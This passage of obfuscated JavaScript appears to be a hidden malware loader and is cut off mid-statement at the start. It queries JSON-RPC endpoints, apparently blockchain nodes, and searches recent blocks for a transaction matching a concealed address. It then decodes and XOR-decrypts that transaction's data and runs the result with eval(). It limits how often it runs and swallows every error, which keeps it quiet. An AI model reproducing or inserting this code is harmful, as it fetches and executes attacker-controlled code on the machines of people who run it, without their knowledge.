_$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
